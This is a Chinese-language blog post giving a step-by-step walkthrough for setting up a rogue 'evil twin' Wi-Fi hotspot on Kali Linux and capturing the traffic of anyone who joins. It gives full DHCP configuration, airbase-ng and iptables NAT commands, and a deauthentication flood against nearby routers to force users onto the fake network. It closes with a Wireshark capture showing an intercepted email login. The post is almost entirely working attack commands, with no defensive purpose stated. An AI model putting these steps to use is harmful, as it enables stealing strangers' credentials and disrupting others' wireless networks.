---
layout: post
title: 创建假的wifi热点
---

本帖介绍怎么创建假的wifi热点，然后抓取连接到这个wifi用户的敏感数据。我们还会给周围的无线路由器发送未认证的包，使这些路由器瘫痪，强迫用户连接（或自动连接）我们创建的假wifi热点。

这种攻击也叫"水坑攻击"－把其他用户都聚集到一个"坑"中。

## 系统要求：

* Kali Linux
* 本地有线网络连接（网络接口 eth0）
* 无线网卡支持包注入模式和监控模式 （网络接口 wlan0）
* 各种抓包工具－Wireshark、 ettercap、tcpdump...

### 获得默认网关

{% highlight shell %}
# route -n
{% endhighlight %}

![创建假的wifi热点]({{ site.baseurl }}/images/2016/5/Screen Shot 2016-05-23 at 18.50.18.png)

这个值在设置iptables时会用到。

### 安装DHCP服务

用处: 为连接假wifi的用户分配IP。

{% highlight shell %}
# apt-get install isc-dhcp-server
{% endhighlight %}

配置DHCP：

{% highlight shell %}
# vim /etc/dhcp/dhcpd.conf
{% endhighlight %}

文件中内容：

```
authoritative;
default-lease-time 600;
max-lease-time 7200;

subnet 192.168.10.0 netmask 255.255.255.0 {
   option routers 192.168.10.1;
   option subnet-mask 255.255.255.0;
   option domain-name "freewifi";
   option domain-name-servers 8.8.8.8,8.8.4.4,192.168.0.1;
   range 192.168.10.100 192.168.10.140;
}
```

先不启动DHCP服务。

### 进入无线网卡的监控模式

{% highlight shell %}
# airmon-ng start wlan0
# airmon-ng check kill
{% endhighlight %}

把wlan0替换为你的无线网卡接口。

要退出监控模式，执行：

{% highlight shell %}
# airmon-ng stop wlan0mon
{% endhighlight %}

### 创建wifi热点

{% highlight shell %}
# airbase-ng -c 11 -e fake_wifi wlan0mon
{% endhighlight %}

![创建假的wifi热点]({{ site.baseurl }}/images/2016/5/Screen Shot 2016-05-24 at 09.06.55.png)

不要终止这个命令。

![创建假的wifi热点]({{ site.baseurl }}/images/2016/5/Screen Shot 2016-05-24 at 09.20.04.png)

现在你已经创建了一个wifi热点，但是这个wifi目前还不能连接。

### 设置网络和防火墙规则

```
# ifconfig at0 up
# ifconfig at0 192.168.10.1 netmask 255.255.255.0
# ifconfig at0 mtu 1400
# route add -net 192.168.10.0 netmask 255.255.255.0 gw 192.168.10.1
# iptables --flush
# iptables --table nat --flush
# iptables --delete-chain
# iptables --table nat --delete-chain
# echo 1 > /proc/sys/net/ipv4/ip_forward
# iptables -t nat -A PREROUTING -p udp -j DNAT --to 192.168.0.1
# iptables -P FORWARD ACCEPT
# iptables --append FORWARD --in-interface at0 -j ACCEPT
# iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
```

### 启动DHCP服务

{% highlight shell %}
# dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0
# systemctl start isc-dhcp-server
{% endhighlight %}

遇到的问题：

```
PID file: /var/run/dhcpd.pid
Can't open lease database /var/lib/dhcp/dhcpd.leases: No such file or directory --
```

创建这个文件解决这个问题：

{% highlight shell %}
# mkdir /var/lib/dhcp/
# touch /var/lib/dhcp/dhcpd.leases
{% endhighlight %}

到此，wifi热点创建完成。

![创建假的wifi热点]({{ site.baseurl }}/images/2016/5/S60524-201256.jpg)

![创建假的wifi热点]({{ site.baseurl }}/images/2016/5/S60524-201355.jpg)

### 瘫痪其他路由

列出周围的wifi：

{% highlight shell %}
# airodump-ng wlan0mon
{% endhighlight %}

然后选择你的目标，记住BSSID和频道。

设置频道：

{% highlight shell %}
# iwconfig wlan0mon channel <频道号>
{% endhighlight %}

开始deauthentication攻击：

{% highlight shell %}
# aireplay-ng -0 5000 -a <BSSID> wlan0mon --ignore-negative-one
{% endhighlight %}

****

OK，现在你可以愉快的抓包了。

***

例如使用Wireshark抓包：

![创建假的wifi热点]({{ site.baseurl }}/images/2016/5/Screenshot from 2016-05-24 20-12-12.png)

上图抓到了我手机邮件客户端登录的邮箱账户。

****

> 更多：<https://github.com/tiancode/learn-hacking>